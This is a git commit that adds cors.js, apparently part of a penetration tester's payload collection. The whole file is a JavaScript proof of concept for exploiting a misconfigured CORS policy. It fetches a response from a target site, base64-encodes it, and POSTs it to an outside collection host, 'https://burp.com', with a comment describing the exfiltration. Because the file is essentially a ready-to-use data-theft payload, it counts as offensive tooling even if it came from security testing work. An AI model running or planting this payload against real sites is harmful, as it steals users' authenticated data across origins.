c7ca8401ef9bbc957069a2ad29d8f037fc26071a
DIMOOON <68978608+reewardius@users.noreply.github.com>
2023-03-28 11:59:46 +0300

    Create cors.js

---
+++ cors.js
@@ -0,0 +1,15 @@
+fetch('https://site-with-cors.com')
+  .then(response => response.blob())
+  .then(blob => {
+    const reader = new FileReader();
+    reader.readAsDataURL(blob);
+    reader.onload = () => {
+      const base64Data = reader.result.split(',')[1];
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://burp.com');
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.send(`data=${encodeURIComponent(base64Data)}`);
+    };
+  })
+  .catch(error => console.error(error));
+// request to burp with base64
